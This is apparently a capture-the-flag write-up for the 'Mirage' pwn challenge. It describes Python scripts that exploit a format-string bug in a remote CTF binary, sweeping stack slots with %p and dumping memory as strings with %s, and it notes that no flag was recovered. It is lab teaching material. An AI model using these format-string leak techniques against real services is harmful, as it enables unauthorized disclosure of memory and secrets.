---
title: "Mirage"
description: "Mirage (ISFCR CTF 2026) was a remote binary at 0.cloud.chals.io:23023 that accepted input with an obvious format-string sink. Since only short, one-shot interactions were reliable over…"
event: "isfcr"
category: "pwn"
categoryLabel: "Pwn"
tags: ["ISFCR CTF 2026","pwn"]
date: "2026-10-22"
teammate: false
source: "isfcr/writeups/mirage.md"
---

Mirage (ISFCR CTF 2026) was a remote binary at `0.cloud.chals.io:23023` that accepted input with an obvious format-string sink. Since only short, one-shot interactions were reliable over WAN, I wrote three small scripts: a stack-slot scanner, a per-slot string extractor, and an interactive prober.

## Files

| Script | Role |
| --- | --- |
| `scan.py` | One persistent connection, sweep `%1$p` … `%200$p` to map populated stack slots |
| `strings.py` | One connection per index, `%<i>$128s` to treat that slot as a pointer and print it as a string |
| `probe.py` | Ad-hoc connection for sending arbitrary test inputs against the `> ` prompt |

## Service Behaviour

The target prints a banner and loops on a `> ` prompt, echoing processed input. The prompt-based read loop in `probe.py` waits for output ending in `> `:

```python
def read_prompt():
    data = b''
    while not data.endswith(b'> '):
        try:
            chunk = s.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
    return data
```

That model — read until `> `, send one line, read the echo — drives everything else.

## Mapping the Stack

`scan.py` opens a single connection and sends `%i$p` for argument indices 1 through 200, keeping the first line of each reply:

```python
for i in range(1, 201):
    s.sendall(f'%{i}$p\n'.encode())
    out = read_prompt().split(b'\n')[0]
    if out != b'(nil)': print(i, out.decode(errors='replace'))
```

Automatically skipping `(nil)` leaves a compact map of which stack slots hold live values. That map is what makes the next stage affordable.

## Draining Strings Slot by Slot

The `%p` sweep only shows the raw slot values. The follow-up, `strings.py`, reinterprets each slot as a pointer with a `%s` conversion clamped to 128 bytes:

```python
s.sendall(f'%{i}$.128s\n'.encode())
x = s.recv(4096)
print(i, repr(x))
```

The `.128s` width does two things at once: it caps the read so a garbage pointer cannot stream an unbounded dump, and it makes each response a predictable size for `recv(4096)`. The script opens a **fresh connection per index**, prints `(index, repr(reply))`, and closes. A fresh socket per probe keeps the loop immune to a crashed or desynchronized session; any exception is caught and reported as the exception type, so one bad index never kills the sweep:

```python
for i in map(int, sys.argv[1:]):
    try:
        s = socket.create_connection(('0.cloud.chals.io', 23023), timeout=3)
        s.settimeout(1)
        s.recv(4096)
        s.sendall(f'%{i}$.128s\n'.encode())
        x = s.recv(4096)
        print(i, repr(x))
        s.close()
    except Exception as e:
        print(i, type(e).__name__, str(e))
```

Running it as `python strings.py 1 2 3 ...` (or any subset) replays only the indices chosen from the `scan.py` map, which keeps the request count low.

## Exploit

```bash
python scan.py                      # find populated stack slots
python strings.py <indices>         # dump each slot as a 128-byte string
python probe.py '<test payload>'    # interact with anything found
```

## Flag

Flag: not recovered in the writeup. The scripts record the leak technique and the swept output, but no flag string survives in the collected artifacts.
